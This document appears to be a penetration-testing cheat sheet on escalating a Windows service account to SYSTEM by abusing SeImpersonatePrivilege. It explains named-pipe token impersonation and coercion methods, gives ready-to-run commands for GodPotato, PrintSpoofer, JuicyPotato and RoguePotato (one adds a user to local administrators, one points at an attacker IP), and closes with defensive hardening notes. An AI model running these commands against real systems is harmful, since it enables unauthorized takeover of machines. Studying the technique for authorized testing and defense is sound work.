# Token Impersonation with SeImpersonatePrivilege

## Background

`SeImpersonatePrivilege` ("Impersonate a client after authentication") is granted by default to service accounts like `NT AUTHORITY\SERVICE`, `NT AUTHORITY\NETWORK SERVICE`, `IIS APPPOOL\*`, and SQL service accounts. It allows a process to call `ImpersonateLoggedOnUser` / `SetThreadToken` and take on the security context of a token it can obtain a handle to. The classic abuse is **privilege escalation from a service account to `NT AUTHORITY\SYSTEM`**.

## The Sequence

1. **You already have a foothold** running as a service account that holds `SeImpersonatePrivilege` (e.g., after exploiting IIS, MSSQL, or a scheduled task). Confirm with:
   ```
   whoami /priv
   ```

2. **Create a named pipe** and wait for a client to connect. The trick is that the *client* must be a privileged process. Windows services, RPC endpoints, and the `SYSTEM`-owned `spoolsv.exe` (Print Spooler) will connect to attacker-controlled named pipes under specific trigger conditions.

3. **Coerce a SYSTEM process to connect** to your pipe. Common coercion primitives:
   - **Print Spooler** (`spoolsv.exe` runs as SYSTEM): trigger it via `RpcRemoteFindFirstPrinterChangeNotificationEx` (the "PrinterBug") or by creating a print job that references your pipe.
   - **EFSRPC / PetitPotam**, **DFSCoerce**, **ShadowCoerce** — RPC-based coercion.
   - **`Seclogon`** (Secondary Logon) — abused by tools like `RottenPotato`/`JuicyPotato`.
   - **`DCOM`** activation (e.g., `MMC20.Application`, `ShellWindows`) — abused by `JuicyPotatoNG`.

4. **Capture the client's token.** When the SYSTEM process connects to your named pipe, the server side receives an impersonation token via `ImpersonateNamedPipeClient`. Because you hold `SeImpersonatePrivilege`, the impersonation succeeds and your thread now runs as `NT AUTHORITY\SYSTEM`.

5. **Duplicate the token** (`DuplicateTokenEx`) and **spawn a new process** with `CreateProcessWithTokenW` / `CreateProcessAsUser` — now a SYSTEM shell.

## Tool + Command

The canonical modern tool is **GodPotato** (works on Windows Server 2012–2022 and Windows 8–11, replacing the older JuicyPotato/RoguePotato which break on newer builds). **PrintSpoofer** is the classic for the Print Spooler path.

**GodPotato:**
```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators <user> /add"
```

**PrintSpoofer** (Print Spooler coercion):
```cmd
PrintSpoofer.exe -i -c cmd
```

**JuicyPotato** (older, pre-2019 builds; requires a CLSID):
```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
```

**RoguePotato** (when outbound SMB is blocked, uses a rogue OXID resolver):
```cmd
RoguePotato.exe -r <attacker-ip> -e "cmd.exe" -l 9999
```

## Defensive Notes

- Remove `SeImpersonatePrivilege` from accounts that don't need it (least privilege; use virtual service accounts or gMSA where possible).
- Disable the Print Spooler service on servers that don't print (`Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`) — this kills the PrintSpoofer/PrinterBug path.
- Patch coercion vectors (PetitPotam, DFSCoerce) and enable RPC filters / SMB signing.
- Monitor for `ImpersonateNamedPipeClient` from unexpected processes, named-pipe creation by service accounts, and child processes of `spoolsv.exe`/`svchost.exe` spawning shells.
- Enable Credential Guard and restrict local admin token duplication via `SeDebugPrivilege` auditing.

> This is documented for authorized penetration testing and defensive hardening only. Use only against systems you own or have explicit written permission to test.